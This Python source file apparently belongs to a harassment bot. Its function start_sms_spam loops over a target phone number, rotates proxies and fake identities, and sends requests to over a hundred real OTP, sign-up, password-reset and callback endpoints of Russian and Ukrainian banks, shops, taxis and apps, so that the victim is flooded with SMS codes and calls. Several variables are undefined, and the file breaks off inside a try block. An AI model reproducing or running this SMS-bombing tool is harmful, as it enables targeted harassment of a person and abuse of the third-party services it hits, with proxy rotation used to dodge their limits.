import random
import sys
from random import choice, randint
from threading import Thread

import requests
from requests import get, post
from user_agent import generate_user_agent

from spam.gen_user_data import gen_agents, gen_email, gen_password, gen_username
from spam.proxy import *
from spam.mask import *
from logs.send_logs import *

from MESSAGES_TEXT import SMS_ERR

sys.path.append("../")
from config import *

async def start_sms_spam(phone, cycles):
    try:
        for i in range(0, cycles):
            password = await gen_password()
            email = await gen_email()
            headers = await gen_agents()
            name = await gen_username()

            proxies = await generate_proxy()

            logger.debug(f"Generate new user agent: {headers}")
            logger.debug(
                f"Generate new user data: name: {name}, password: {password}, email: {email}"
            )
            logger.debug(f"Proxy: {await generate_proxy()}")

            _phone = phone

            if _phone[0] == '+':
                _phone = _phone[1:]
            if _phone[0] == '8':
                _phone = '7'+_phone[1:]
            if _phone[0] == '9':
                _phone = '7'+_phone

            _phone9 = _phone[1:]
            _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
            _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
            _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
            _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
            _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

            logger.debug(f"_phone9: {_phone9}")
            logger.debug(f"_phone9dostavista {_phone9dostavista}")
            logger.debug(f"_phoneOstin: {_phoneOstin}")
            logger.debug(f"_phonePizzahut: {_phonePizzahut}")

            try:
                logger.debug(requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, proxies=proxies, timeout=2).json()["res"])
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/', proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/', proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://plink.tech/register/',json={"phone": _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                logger.debug(requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)

            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone[1:], maska="8(###)###-##-##")
                logger.debug(requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=2))
                logger.debug(requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}), proxies=proxies, timeout=2 )
            except:
                logger.warning(SMS_ERR)
            try:
                # под сомнением 
                phonee=mask(str=phone, maska="#(###)###-##-##")
                logger.debug(requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+#(###)###-##-##")
                logger.debug(requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="8(###)###-##-##")
                logger.debug(requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(phone, maska="+# (###) ### - ## - ##")
                logger.debug(requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="(+#)##########")
                logger.debug(requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="8(###)###-##-##")
                logger.debug(requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="8 (###) ###-##-##")
                logger.debug(requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="8-###-###-##-##")
                logger.debug(requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+#(###)###-##-##")
                logger.debug(requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonee, "alien": "0"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+#-###-###-##-##")
                logger.debug(requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonee}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="8-###-###-##-##")
                logger.debug(requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-####")
                logger.debug(requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+#-###-###-##-##")
                logger.debug(requests.post("https://paylate.ru/registry",data={"mobile": phonee,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-####")
                logger.debug(requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.ollis.ru/gql",json={"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="8 (###) ###-##-##")
                requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonee,"call_time": "1","pravila2": "on"})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://auth.multiplex.ua/login", json={"login": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data={"+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
